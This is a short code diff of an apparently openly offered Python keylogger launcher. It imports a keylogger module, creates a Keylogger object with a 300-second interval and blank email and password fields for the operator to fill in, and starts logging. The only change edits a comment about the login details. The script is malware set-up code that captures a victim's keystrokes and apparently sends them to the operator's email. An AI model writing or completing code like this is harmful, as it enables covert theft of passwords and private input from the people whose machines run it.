@@ -3,5 +3,5 @@ import keylogger
 
 # Make sure to edit your login here
 
-keeginlogarithm = keylogger.Keylogger(300, "", "") # in the blank spaces enter your email,password | Use a new email
+keeginlogarithm = keylogger.Keylogger(300, "", "") # in the blank spaces enter your email,password 
 keeginlogarithm.start()
